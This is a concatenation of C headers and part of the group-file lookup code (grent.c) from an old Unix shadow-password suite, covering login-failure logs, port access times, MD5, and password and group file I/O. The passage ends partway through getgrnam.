extern struct dialup *getduent P_((void));
extern struct dialup *getdushell P_((const char *));
extern int putduent P_((const struct dialup *, FILE *));
extern int isadialup P_((const char *));

#define	DIALPWD	"/etc/d_passwd"
#define	DIALUPS	"/etc/dialups"

#endif
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * faillog.h - login failure logging file format
 *
 *	$Id: faillog.h,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $
 *
 * The login failure file is maintained by login(1) and faillog(8)
 * Each record in the file represents a separate UID and the file
 * is indexed in that fashion.
 */

#ifndef _FAILLOG_H
#define _FAILLOG_H

#if defined(__linux__)
#define FAILFILE	"/var/log/faillog"
#elif defined(SVR4)
#define	FAILFILE	"/var/adm/faillog"
#else
#define	FAILFILE	"/usr/adm/faillog"
#endif

struct	faillog {
	short	fail_cnt;	/* failures since last success */
	short	fail_max;	/* failures before turning account off */
	char	fail_line[12];	/* last failure occured here */
	time_t	fail_time;	/* last failure occured then */
#ifdef FAILLOG_LOCKTIME
	/*
	 * If nonzero, the account will be re-enabled if there are no
	 * failures after fail_locktime seconds since last failure.
	 */
	long	fail_locktime;
#endif
};

#endif
#ifndef _GETDEF_H
#define _GETDEF_H

/* getdef.c */
#if __STDC__
extern int getdef_bool(const char *);
extern long getdef_long(const char *, long);
extern int getdef_num(const char *, int);
extern char *getdef_str(const char *);
#else
extern int getdef_bool();
extern long getdef_long();
extern int getdef_num();
extern char *getdef_str();
#endif

#endif /* _GETDEF_H */
#ifndef _GROUPIO_H
#define _GROUPIO_H

#include <grp.h>

/* groupio.c */
extern struct group *__gr_dup P_((const struct group *));
extern int gr_close P_((void));
extern const struct group *gr_locate P_((const char *));
extern int gr_lock P_((void));
extern int gr_name P_((const char *));
extern const struct group *gr_next P_((void));
extern int gr_open P_((int));
extern int gr_remove P_((const char *));
extern int gr_rewind P_((void));
extern int gr_unlock P_((void));
extern int gr_update P_((const struct group *));

#ifdef NEED_GR_FILE_ENTRY
struct gr_file_entry {
	char *grf_line;
	int grf_changed;
	struct group *grf_entry;
	struct gr_file_entry *grf_next;
};
#endif
#endif /* _GROUPIO_H */
#ifndef MD5_H
#define MD5_H

#ifdef __alpha
typedef unsigned int uint32;
#else
typedef unsigned long uint32;
#endif

struct MD5Context {
	uint32 buf[4];
	uint32 bits[2];
	unsigned char in[64];
};

void MD5Init(struct MD5Context *context);
void MD5Update(struct MD5Context *context, unsigned char const *buf,
	       unsigned len);
void MD5Final(unsigned char digest[16], struct MD5Context *context);
void MD5Transform(uint32 buf[4], uint32 const in[16]);

/*
 * This is needed to make RSAREF happy on some MS-DOS compilers.
 */
typedef struct MD5Context MD5_CTX;

#endif /* !MD5_H */
/*
 * Copyright 1989 - 1991, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * port.h - structure of /etc/porttime
 *
 *	$Id: port.h,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $
 *
 *	Each entry in /etc/porttime consists of a TTY device
 *	name or "*" to indicate all TTY devices, followed by
 *	a list of 1 or more user IDs or "*" to indicate all
 *	user names, followed by a list of zero or more valid
 *	login times.  Login time entries consist of zero or
 *	more day names (Su, Mo, Tu, We, Th, Fr, Sa, Wk, Al)
 *	followed by a pair of time values in HHMM format
 *	separated by a "-".
 */

/*
 * PORTS - Name of system port access time file.
 * PORT_IDS - Allowable number of IDs per entry.
 * PORT_TTY - Allowable number of TTYs per entry.
 * PORT_TIMES - Allowable number of time entries per entry.
 * PORT_DAY - Day of the week to a bit value (0 = Sunday).
 */

#define	PORTS	"/etc/porttime"
#define	PORT_IDS	64
#define	PORT_TTY	64
#define	PORT_TIMES	24
#define	PORT_DAY(day)	(1<<(day))

/*
 *	pt_names - pointer to array of device names in /dev/
 *	pt_users - pointer to array of applicable user IDs.
 *	pt_times - pointer to list of allowable time periods.
 */

struct	port	{
	char	**pt_names;
	char	**pt_users;
	struct	pt_time	*pt_times;
};

/*
 *	t_days - bit array for each day of the week (0 = Sunday)
 *	t_start - starting time for this entry
 *	t_end - ending time for this entry
 */

struct	pt_time	{
	short	t_days;
	short	t_start;
	short	t_end;
};
/*
 * prototypes.h
 *
 * Missing function prototypes
 *
 * Juha Virtanen, <jiivee@hut.fi>; November 1995
 */
/*
 * $Id: prototypes.h,v 1.3 1996/09/25 03:19:53 marekm Exp $
 *
 * Added a macro to work around ancient (non-ANSI) compilers, just in case
 * someone ever tries to compile this with SunOS cc...  --marekm
 */

#ifndef _PROTOTYPES_H
#define _PROTOTYPES_H

#include <sys/stat.h>
#include <utmp.h>
#include <pwd.h>
#include <grp.h>
#include "faillog.h"

#ifndef P_
#if __STDC__
#define P_(x) x
#else
#define P_(x) ()
#endif
#endif

#include "defines.h"

/* addgrps.c */
extern int add_groups P_((const char *));
extern void add_cons_grps P_((void));

/* age.c */
#ifdef SHADOWPWD
extern void agecheck P_((const struct passwd *pw, const struct spwd *sp));
extern int expire P_((const struct passwd *pw, const struct spwd *sp));
extern int isexpired P_((const struct passwd *pw, const struct spwd *sp));
#else
extern void agecheck P_((const struct passwd *pw));
extern int expire P_((const struct passwd *pw));
extern int isexpired P_((const struct passwd *pw));
#endif

/* basename() renamed to Basename() to avoid libc name space confusion */
/* basename.c */
extern char *Basename P_((char *str));

/* chkname.c */
extern int check_name P_((const char *));

/* chowndir.c */
extern int chown_tree P_((const char *, uid_t, uid_t, gid_t, gid_t));

/* chowntty.c */
extern void chown_tty P_((const char *, const struct passwd *));

/* commonio.c */
extern int create_backup_file P_((FILE *, const char *, const struct stat *));

/* console.c */
extern int console P_((const char *tty));

/* copydir.c */
extern int copy_tree P_((const char *, const char *, uid_t, gid_t));
extern int remove_tree P_((const char *));

/* dialchk.c */
extern int dialcheck P_((const char *tty, const char *sh));

/* encrypt.c */
extern char *pw_encrypt P_((const char *, const char *));

/* entry.c */
extern void entry P_((const char *name, struct passwd *pwent));

/* env.c */
extern void addenv P_((const char *, const char *));
extern void initenv P_((void));
extern void set_env P_((int, char **));

/* failure.c */
extern int failcheck P_((int uid, struct faillog *faillog, int failed));
extern void failprint P_((struct faillog *fail));
extern void failtmp P_((struct utmp *failent));
extern void failure P_((int uid, char *tty, struct faillog *faillog));

/* fields.c */
extern void change_field P_((char *buf, size_t maxsize, const char *prompt));
extern int valid_field P_((const char *field, const char *illegal));

/* grdbm.c */
extern int gr_dbm_remove P_((const struct group *gr));
extern int gr_dbm_update P_((const struct group *gr));
extern int gr_dbm_present P_((void));

/* grent.c */
extern int fputsx P_((const char *s, FILE *stream));
extern int putgrent P_((const struct group *g, FILE *f));

/* grpack.c */
extern int gr_pack P_((const struct group *group, char *buf));
extern int gr_unpack P_((char *buf, int len, struct group *group));

#ifdef SHADOWGRP
/* gsdbm.c */
extern int sg_dbm_remove P_((const char *name));
extern int sg_dbm_update P_((const struct sgrp *sgr));
extern int sg_dbm_present P_((void));

/* gspack.c */
extern int sgr_pack P_((const struct sgrp *sgrp, char *buf));
extern int sgr_unpack P_((char *buf, int len, struct sgrp *sgrp));
#endif

/* hushed.c */
extern int hushed P_((struct passwd *pw));

/* limits.c */
extern void setup_limits P_((const struct passwd *));

/* list.c */
extern char **add_list P_((char **list, const char *member));
extern char **del_list P_((char **list, const char *member));
extern char **dup_list P_((char * const *list));
extern int is_on_list P_((char * const *list, const char *member));
extern char **comma_to_list P_((const char *comma));

/* login.c */
extern void login_prompt P_((const char *, char *, int));

/* obscure.c */
extern int obscure P_((const char *, const char *, const struct passwd *));

/* port.c */
extern int isttytime P_((const char *, const char *, time_t));

/* pwd2spwd.c */
#ifdef SHADOWPWD
extern struct spwd *pwd_to_spwd P_((const struct passwd *pw));
#endif

/* pwdbm.c */
extern int pw_dbm_remove P_((const struct passwd *pw));
extern int pw_dbm_update P_((const struct passwd *pw));
extern int pw_dbm_present P_((void));

/* pwpack.c */
extern int pw_pack P_((const struct passwd *passwd, char *buf));
extern int pw_unpack P_((char *buf, int len, struct passwd *passwd));

/* rad64.c */
extern int c64i P_((char c));
extern int i64c P_((int i));

/* setugid.c */
extern int setup_uid_gid P_((const struct passwd *, int));

/* setup.c */
extern void setup P_((struct passwd *info));

/* setupenv.c */
extern void setup_env P_((struct passwd *));

/* shell.c */
extern void shell P_((char *file, char *arg));

#ifdef SHADOWPWD
/* spdbm.c */
extern int sp_dbm_remove P_((const char *user));
extern int sp_dbm_update P_((const struct spwd *sp));
extern int sp_dbm_present P_((void));

/* sppack.c */
extern int spw_pack P_((const struct spwd *spwd, char *buf));
extern int spw_unpack P_((char *buf, int len, struct spwd *spwd));
#endif

/* strtoday.c */
extern long strtoday P_((const char *str));

/* ttytype.c */
extern void ttytype P_((const char *line));

/* ulimit.c */
extern void set_filesize_limit P_((int));

/* utmp.c */
extern void checkutmp P_((int));
extern void setutmp P_((const char *, const char *));

/* valid.c */
extern int valid P_((const char *, const struct passwd *));

/* xmalloc.c */
extern char *xmalloc P_((unsigned size));
extern char *xstrdup P_((const char *str));

#endif /* _PROTOTYPES_H */
/*
 * Copyright 1992 - 1993, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *	$Id: pwauth.h,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $
 */

#if	__STDC__
int pw_auth(const char *program,const char *user,int flag,const char *input);
#else
int	pw_auth ();
#endif

/*
 * Local access
 */

#define	PW_SU		1
#define	PW_LOGIN	2

/*
 * Administrative functions
 */

#define	PW_ADD		101
#define	PW_CHANGE	102
#define	PW_DELETE	103

/*
 * Network access
 */

#define	PW_TELNET	201
#define	PW_RLOGIN	202
#define	PW_FTP		203
#define	PW_REXEC	204
#ifndef _PWIO_H
#define _PWIO_H

#include <pwd.h>

/* pwio.c */
extern struct passwd *__pw_dup P_((const struct passwd *));
extern int pw_close P_((void));
extern const struct passwd *pw_locate P_((const char *));
extern int pw_lock P_((void));
extern int pw_name P_((const char *));
extern const struct passwd *pw_next P_((void));
extern int pw_open P_((int));
extern int pw_remove P_((const char *));
extern int pw_rewind P_((void));
extern int pw_unlock P_((void));
extern int pw_update P_((const struct passwd *));

#ifdef NEED_PW_FILE_ENTRY
struct pw_file_entry {
	char *pwf_line;
	int pwf_changed;
	struct passwd *pwf_entry;
	struct pw_file_entry *pwf_next;
};
#endif
#endif /* _PWIO_H */
/*
 * $Id: rcsid.h,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $
 */
#if defined(NO_RCSID) || defined(lint)
#define RCSID(x) /* empty */
#elif __STDC__
/*
 * This function is never called from anywhere, but it calls itself
 * recursively only to fool gcc to not generate warnings :-).
 */
static const char *rcsid(const char *);
#define RCSID(x) static const char *rcsid(const char *s) { return rcsid(x); }
#else
#define RCSID(x) static char *rcsid(s) char *s; { return rcsid(x); }
#endif
#ifndef _SGROUPIO_H
#define _SGROUPIO_H

/* sgroupio.c */
extern struct sgrp *__sgr_dup P_((const struct sgrp *));
extern int sgr_close P_((void));
extern const struct sgrp *sgr_locate P_((const char *));
extern int sgr_lock P_((void));
extern int sgr_name P_((const char *));
extern const struct sgrp *sgr_next P_((void));
extern int sgr_open P_((int));
extern int sgr_remove P_((const char *));
extern int sgr_rewind P_((void));
extern int sgr_unlock P_((void));
extern int sgr_update P_((const struct sgrp *));

#ifdef NEED_SG_FILE_ENTRY
struct sg_file_entry {
	char	*sgr_line;
	int	sgr_changed;
	struct	sgrp	*sgr_entry;
	struct	sg_file_entry *sgr_next;
};
#endif
#endif /* _SGROUPIO_H */
#ifndef _SHADOWIO_H
#define _SHADOWIO_H

/* shadowio.c */
extern struct spwd *__spw_dup P_((const struct spwd *));
extern int spw_close P_((void));
extern const struct spwd *spw_locate P_((const char *));
extern int spw_lock P_((void));
extern int spw_name P_((const char *));
extern const struct spwd *spw_next P_((void));
extern int spw_open P_((int));
extern int spw_remove P_((const char *));
extern int spw_rewind P_((void));
extern int spw_unlock P_((void));
extern int spw_update P_((const struct spwd *));

#ifdef NEED_SPW_FILE_ENTRY
struct spw_file_entry {
	char *spwf_line;
	int spwf_changed;
	struct spwd *spwf_entry;
	struct spw_file_entry *spwf_next;
};
#endif
#endif /* _SHADOWIO_H */
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#ifdef GETGRENT

#include "rcsid.h"
RCSID("$Id: grent.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <stdio.h>
#include <grp.h>
#include "defines.h"

#ifdef	NDBM
#include <ndbm.h>
#include <fcntl.h>
DBM	*gr_dbm;
int	gr_dbm_mode = -1;
#endif	/* NDBM */

#define	NFIELDS	4
#define	MAXMEM	1024

static	char	grpbuf[4*BUFSIZ];
static	char	*grpfields[NFIELDS];
static	char	*members[MAXMEM+1];
static	struct	group	grent;

static	FILE	*grpfp;
static	char	*grpfile = GROUP_FILE;

#ifdef	NDBM
static	int	dbmopened;
static	int	dbmerror;
#endif	/* NDBM */

#ifdef	USE_NIS
static	int	nis_used;
static	int	nis_ignore;
static	enum	{ native, start, middle, native2 } nis_state;
static	int	nis_bound;
static	char	*nis_domain;
static	char	*nis_key;
static	int	nis_keylen;
static	char	*nis_val;
static	int	nis_vallen;
#define	IS_NISCHAR(c) ((c)=='+')
#endif

#ifdef	USE_NIS

/*
 * __setgrNIS - turn on or off NIS searches
 */

void
__setgrNIS (flag)
int	flag;
{
	nis_ignore = ! flag;

	if (nis_ignore)
		nis_used = 0;
}

/*
 * __isgrNIS - last getgr* returned a NIS group
 */

int
__isgrNIS (void)
{
	return nis_state == middle;
}

/*
 * bind_nis - bind to NIS server
 */

static int
bind_nis ()
{
	if (yp_get_default_domain (&nis_domain))
		return -1;

	nis_bound = 1;
	return 0;
}
#endif

/*
 * list - turn a comma-separated string into an array of (char *)'s
 *
 *	list() converts the comma-separated list of member names into
 *	an array of character pointers.
 *
 *	WARNING: I profiled this once with and without strchr() calls
 *	and found that using a register variable and an explicit loop
 *	works best.  For large /etc/group files, this is a major win.
 */

static char **
list (s)
register char	*s;
{
	int	nmembers = 0;

	while (s && *s) {
		members[nmembers++] = s;
		while (*s && *s != ',')
			s++;

		if (*s)
			*s++ = '\0';
	}
	members[nmembers] = (char *) 0;
	return members;
}

static struct group *
sgetgrent (buf)
	const char *buf;
{
	int	i;
	char	*cp;

	strncpy (grpbuf, buf, sizeof grpbuf);
	grpbuf[sizeof grpbuf - 1] = '\0';
	if ((cp = strrchr (grpbuf, '\n')))
		*cp = '\0';

	for (cp = grpbuf, i = 0;i < NFIELDS && cp;i++) {
		grpfields[i] = cp;
		if ((cp = strchr (cp, ':')))
			*cp++ = 0;
	}
	if (i < (NFIELDS-1) || *grpfields[2] == '\0')
#ifdef	USE_NIS
		if (! IS_NISCHAR (grpfields[0][0]))
			return 0;
		else
			nis_used = 1;
#else
		return 0;
#endif
	grent.gr_name = grpfields[0];
	grent.gr_passwd = grpfields[1];
	grent.gr_gid = atoi (grpfields[2]);
	grent.gr_mem = list (grpfields[3]);

	return (&grent);
}

/*
 * fgetgrent - get a group file entry from a stream
 *
 * fgetgrent() reads the next line from a group file formatted stream
 * and returns a pointer to the group structure for that line.
 */

struct group *
fgetgrent (fp)
	FILE *fp;
{
	char	buf[BUFSIZ*4];
	char	*cp;

#ifdef	USE_NIS
	while (fgetsx (buf, sizeof buf, fp) != (char *) 0)
#else
	if (fgetsx (buf, sizeof buf, fp) != (char *) 0)
#endif
	{
		if (cp = strchr (buf, '\n'))
			*cp = '\0';
#ifdef	USE_NIS
		if (nis_ignore && IS_NISCHAR (buf[0]))
			continue;
#endif
		return (sgetgrent (buf));
	}
	return 0;
}

/*
 * endgrent - close a group file
 *
 * endgrent() closes the group file if open.
 */

SETXXENT_TYPE
endgrent ()
{
	if (grpfp)
		if (fclose (grpfp))
			SETXXENT_RET(-1);
	grpfp = 0;
#ifdef	NDBM
	if (dbmopened && gr_dbm) {
		dbm_close (gr_dbm);
		gr_dbm = 0;
	}
	dbmopened = 0;
	dbmerror = 0;
#endif	/* NDBM */
	SETXXENT_RET(0);
}

/*
 * getgrent - get a group entry from the group file
 *
 * getgrent() opens the group file, if not already opened, and reads
 * a single entry.  NULL is returned if any errors are encountered reading
 * the group file.
 */

struct group *
getgrent ()
{
#ifdef	USE_NIS
	int	nis_1_group = 0;
	struct	group	*val;
	char	buf[BUFSIZ];
#endif
	if (! grpfp) {
		SETXXENT_TEST(setgrent())
			return 0;
	}
#ifdef	USE_NIS
again:
	/*
	 * See if we are reading from the local file.
	 */

	if (nis_state == native || nis_state == native2) {

		/*
		 * Get the next entry from the group file.  Return NULL
		 * right away if there is none.
		 */

		if (! (val = fgetgrent (grpfp)))
			return 0;

		/*
		 * If this entry began with a NIS escape character, we have
		 * to see if this is just a single group, or if the entire
		 * map is being asked for.
		 */

		if (IS_NISCHAR (val->gr_name[0])) {
			if (val->gr_name[1])
				nis_1_group = 1;
			else
				nis_state = start;
		}

		/*
		 * If this isn't a NIS group and this isn't an escape to go
		 * use a NIS map, it must be a regular local group.
		 */

		if (nis_1_group == 0 && nis_state != start)
			return val;

		/*
		 * If this is an escape to use an NIS map, switch over to
		 * that bunch of code.
		 */

		if (nis_state == start)
			goto again;

		/*
		 * NEEDSWORK.  Here we substitute pieces-parts of this entry.
		 */

		return 0;
	} else {
		if (nis_bound == 0) {
			if (bind_nis ()) {
				nis_state = native2;
				goto again;
			}
		}
		if (nis_state == start) {
			if (yp_first (nis_domain, "group.byname", &nis_key,
				&nis_keylen, &nis_val, &nis_vallen)) {
				nis_state = native2;
				goto again;
			}
			nis_state = middle;
		} else if (nis_state == middle) {
			if (yp_next (nis_domain, "group.byname", nis_key,
				nis_keylen, &nis_key, &nis_keylen,
				&nis_val, &nis_vallen)) {
				nis_state = native2;
				goto again;
			}
		}
		return sgetgrent (nis_val);
	}
#else
	return fgetgrent (grpfp);
#endif
}

/*
 * getgrgid - locate the group entry for a given GID
 *
 * getgrgid() locates the first group file entry for the given GID.
 * If there is a valid DBM file, the DBM files are queried first for
 * the entry.  Otherwise, a linear search is begun of the group file
 * searching for an entry which matches the provided GID.
 */

struct group *
getgrgid (gid)
	gid_t gid;
{
	struct	group	*grp;
#ifdef NDBM
	datum	key;
	datum	content;
	int	cnt;
	int	i;
	char	*cp;
	char	grpkey[64];
#endif	/* NDBM */
#if defined(AUTOSHADOW) && defined(SHADOWGRP)
	struct	sgrp	*sgrp;
#endif	/* AUTOSHADOW && SHADOWGRP */
#ifdef	USE_NIS
	char	buf[BUFSIZ];
	static	char	save_name[16];
#endif

	SETXXENT_TEST(setgrent())
		return 0;
#ifdef NDBM

	/*
	 * If the DBM file are now open, create a key for this GID and
	 * try to fetch the entry from the database.  A matching record
	 * will be unpacked into a static structure and returned to
	 * the user.
	 */

	if (dbmopened) {
		grent.gr_gid = gid;
		key.dsize = sizeof grent.gr_gid;
		key.dptr = (char *) &grent.gr_gid;
		content = dbm_fetch (gr_dbm, key);
		if (content.dptr == 0)
			return 0;

		if (content.dsize == sizeof (int)) {
			memcpy ((char *) &cnt, content.dptr, content.dsize);
			for (cp = grpbuf, i = 0;i < cnt;i++) {
				memcpy (grpkey, (char *) &i, (int) sizeof i);
				memcpy (grpkey + sizeof i,
					(char *) &grent.gr_gid,
					(int) sizeof grent.gr_gid);

				key.dsize = sizeof i + sizeof grent.gr_gid;
				key.dptr = grpkey;

				content = dbm_fetch (gr_dbm, key);
				if (content.dptr == 0)
					return 0;

				memcpy (cp, content.dptr, content.dsize);
				cp += content.dsize;
			}
			grent.gr_mem = members;
			gr_unpack (grpbuf, cp - grpbuf, &grent);
#if defined(AUTOSHADOW) && defined(SHADOWGRP)
			if (sgrp = getsgnam (grent.gr_name)) {
				grent.gr_passwd = sgrp->sg_passwd;
				grent.gr_mem = sgrp->sg_mem;
			}
#endif	/* AUTOSHADOW && SHADOWGRP */
			return &grent;
		} else {
			grent.gr_mem = members;
			memcpy (grpbuf, content.dptr, content.dsize);
			gr_unpack (grpbuf, content.dsize, &grent);
#if defined(AUTOSHADOW) && defined(SHADOWGRP)
			if (sgrp = getsgnam (grent.gr_name)) {
				grent.gr_passwd = sgrp->sg_passwd;
				grent.gr_mem = sgrp->sg_mem;
			}
#endif	/* AUTOSHADOW && SHADOWGRP */
			return &grent;
		}
	}
#endif	/* NDBM */
#ifdef	USE_NIS

	if (nis_used) {
again:

		/*
		 * Search the group.bygid map for this group.
		 */

		if (! nis_bound)
			bind_nis ();

		if (nis_bound) {
			char	*cp;

			sprintf (buf, "%d", gid);

			if (yp_match (nis_domain, "group.bygid", buf,
					strlen (buf), &nis_val, &nis_vallen) == 0) {
				if (cp = strchr (nis_val, '\n'))
					*cp = '\0';

				nis_state = middle;
				if (grp = sgetgrent (nis_val)) {
					strcpy (save_name, grp->gr_name);
					nis_key = save_name;
					nis_keylen = strlen (save_name);
				}
				return grp;
			} else
				nis_state = native2;
		}
	}
#endif
	/*
	 * Search for an entry which matches the GID.  Return the
	 * entry when a match is found.
	 */

	while (grp = getgrent ()) {
		if (grp->gr_gid == gid)
			break;

#ifdef	USE_NIS
		if (nis_used && nis_state != native && nis_state != native2)
			goto again;
#endif
	}
#if defined(AUTOSHADOW) && defined(SHADOWGRP)
	if (grp) {
		if (sgrp = getsgnam (grent.gr_name)) {
			grp->gr_passwd = sgrp->sg_passwd;
			grp->gr_mem = sgrp->sg_mem;
		}
	}
#endif	/* AUTOSHADOW && SHADOWGRP */
	return grp;
}

/*
 * getgrnam - locate the group entry for a given name
 *
 * getgrnam() locates the first group file entry for the given name.
 * If there is a valid DBM file, the DBM files are queried first for
 * the entry.  Otherwise, a linear search is begun of the group file
 * searching for an entry which matches the provided name.
 */

struct group *
getgrnam (name)
	const char *name;
{
	struct	group	*grp;
#ifdef NDBM
	datum	key;
	datum	content;
	int	cnt;
	int	i;
	char	*cp;
	char	grpkey[64];
#endif	/* NDBM */
#if defined(AUTOSHADOW) && defined(SHADOWGRP)
	struct	sgrp	*sgrp;
#endif	/* AUTOSHADOW && SHADOWGRP */
#ifdef	USE_NIS
	char	buf[BUFSIZ];
	static	char	save_name[16];
#endif

	SETXXENT_TEST(setgrent())
		return 0;
#ifdef NDBM

	/*
	 * If the DBM file are now open, create a key for this GID and
	 * try to fetch the entry from the database.  A matching record
	 * will be unpacked into a static structure and returned to
	 * the user.
	 */

	if (dbmopened) {
		key.dsize = strlen (name);
		key.dptr = (void *) name;
		content = dbm_fetch (gr_dbm, key);
		if (content.dptr == 0)
			return 0;

		if (content.dsize == sizeof (int)) {
			memcpy ((char *) &cnt, content.dptr, content.dsize);
			for (cp = grpbuf, i = 0;i < cnt;i++) {
				memcpy (grpkey, (char *) &i, (int) sizeof i);
				strcpy (grpkey + sizeof i, name);

				key.dsize = sizeof i + strlen (name);
				key.dptr = grpkey;

				content = dbm_fetch (gr_dbm, key);
				if (content.dptr == 0)
					return 0;

				memcpy (cp, content.dptr, content.dsize);
				cp += content.dsize;
			}
			grent.gr_mem = members;
			gr_unpack (grpbuf, cp - grpbuf, &grent);
#if defined(AUTOSHADOW) && defined(SHADOWGRP)
			if (sgrp = getsgnam (grent.gr_name)) {
